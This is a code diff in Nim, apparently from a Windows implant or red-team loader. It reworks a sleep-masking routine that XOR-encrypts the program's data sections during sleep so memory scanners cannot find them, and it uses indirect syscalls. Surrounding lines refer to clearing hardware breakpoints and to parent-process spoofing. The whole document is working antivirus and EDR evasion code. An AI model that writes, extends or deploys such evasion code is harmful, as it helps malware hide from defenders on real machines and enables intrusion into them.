@@ -67,11 +67,11 @@ proc clearHWBP*() =
 const XOR_SLEEP_KEY: byte = 0xA7
 
 proc sleepMasked*(ms: int) =
-  ## Sleep masking: XOR-encrypts non-executable sections (strings, imports) and
-  ## sets executable sections (.text) to PAGE_NOACCESS. During sleep both code
-  ## patterns and data strings are invisible to live memory scanners.
-  ## NtDelayExecution runs from ntdll so it survives the .text protection.
+  ## Sleep masking: XOR-encrypts non-executable sections during sleep.
+  ## Exec sections (.text) are left untouched so Pass 2 can execute normally.
   if ms <= 0: return
+  when defined(noSleepMask):
+    Sleep(DWORD(ms)); return
 
   let base = GetModuleHandleW(nil)
   if base == 0:
@@ -83,45 +83,46 @@ proc sleepMasked*(ms: int) =
   let nsec = int(nt.FileHeader.NumberOfSections)
   let firstSec = IMAGE_FIRST_SECTION(nt)
 
-  # Pass 1: XOR-encrypt non-exec sections; set exec sections NOACCESS.
+  # Identify which sections to mask: skip exec sections AND skip .idata.
+  # Skipping .idata preserves the IAT so VirtualProtect (called in Pass 2)
+  # can still resolve to the real kernel32 function through the IAT.
+  proc shouldMask(sh: ptr IMAGE_SECTION_HEADER): bool {.inline.} =
+    if sh.SizeOfRawData == 0: return false
+    if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_EXECUTE)) != 0: return false
+    # Skip .idata (import table) — contains IAT function pointers that must
+    # remain valid so VirtualProtect calls in Pass 2 can resolve correctly.
+    let nm = cast[ptr UncheckedArray[byte]](addr sh.Name[0])
+    if nm[0] == byte('.') and nm[1] == byte('i') and nm[2] == byte('d'): return false
+    return true
+
+  # Pass 1: XOR-encrypt data sections (except exec and .idata).
   for i in 0 ..< nsec:
     let sh = cast[ptr IMAGE_SECTION_HEADER](cast[int](firstSec) + i * sizeof(IMAGE_SECTION_HEADER))
-    if sh.SizeOfRawData == 0: continue
+    if not shouldMask(sh): continue
     let secAddr = cast[ptr UncheckedArray[byte]](cast[int](base) + sh.VirtualAddress.int)
     let size    = sh.SizeOfRawData.int
-    if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_EXECUTE)) != 0:
-      # Exec section: protect only — do NOT XOR (code must survive return from ntdll)
-      var ba   = cast[LPVOID](secAddr)
-      var sz   = SIZE_T(size)
-      var old: DWORD
-      discard ntProtectVirtualMemory(HANDLE(-1), ba, sz, PAGE_NOACCESS, addr old)
-    else:
-      # Data section: XOR-encrypt + mark read-only
-      var old: DWORD
-      discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
-      for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
-      discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READONLY, addr old)
+    var old: DWORD
+    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
+    for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
+    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READONLY, addr old)
 
   # Sleep via indirect syscall — NtDelayExecution runs from ntdll, not our .text.
   sleepViaNt(ms)
 
-  # Pass 2: restore exec sections first (we need .text executable to continue),
-  # then XOR-decrypt data sections.
+  # Pass 2: XOR-decrypt and restore protection for masked sections.
   for i in 0 ..< nsec:
     let sh = cast[ptr IMAGE_SECTION_HEADER](cast[int](firstSec) + i * sizeof(IMAGE_SECTION_HEADER))
-    if sh.SizeOfRawData == 0: continue
+    if not shouldMask(sh): continue
     let secAddr = cast[ptr UncheckedArray[byte]](cast[int](base) + sh.VirtualAddress.int)
     let size    = sh.SizeOfRawData.int
-    if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_EXECUTE)) != 0:
-      var ba   = cast[LPVOID](secAddr)
-      var sz   = SIZE_T(size)
-      var old: DWORD
-      discard ntProtectVirtualMemory(HANDLE(-1), ba, sz, PAGE_EXECUTE_READ, addr old)
-    else:
-      var old: DWORD
-      discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
-      for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
-      discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), old, addr old)
+    var old: DWORD
+    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
+    for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
+    let origProt: DWORD = if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_WRITE)) != 0:
+                            DWORD(PAGE_READWRITE)
+                          else:
+                            DWORD(PAGE_READONLY)
+    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), origProt, addr old)
 
 # ── PPID spoofing for child processes ─────────────────────────────────────────
 const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS* = DWORD_PTR(0x00020000)
